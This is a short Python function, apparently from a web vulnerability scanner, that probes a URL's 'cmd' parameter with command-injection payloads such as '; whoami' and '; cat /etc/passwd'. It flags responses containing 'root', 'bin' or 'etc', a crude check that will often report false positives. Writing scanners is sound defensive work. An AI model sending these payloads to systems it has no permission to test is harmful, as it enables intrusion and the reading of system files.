import requests

def test_command_injection(url):
    cmd_payloads = [
        "; ls", "&& ls", "| ls", "|| ls",
        "; whoami", "&& whoami", "| whoami",
        "; cat /etc/passwd", "&& cat /etc/passwd"
    ]
    
    vulnerabilities = []

    for payload in cmd_payloads:
        test_url = f"{url}?cmd={payload}"  # Modify this based on site input structure
        print(f"  🔹 Testing payload: {payload}")

        try:
            response = requests.get(test_url, timeout=5)

            # If common system command outputs appear in the response, it's vulnerable
            if "root" in response.text or "bin" in response.text or "etc" in response.text:
                vulnerabilities.append({
                    "type": "Command Injection",
                    "payload": payload,
                    "recommendation": "Sanitize user input and avoid using unsanitized system commands."
                })
                print("  ❌ Vulnerability Found!")

        except requests.exceptions.RequestException:
            print("  ⚠️ Connection Error. Skipping payload.")

    return vulnerabilities
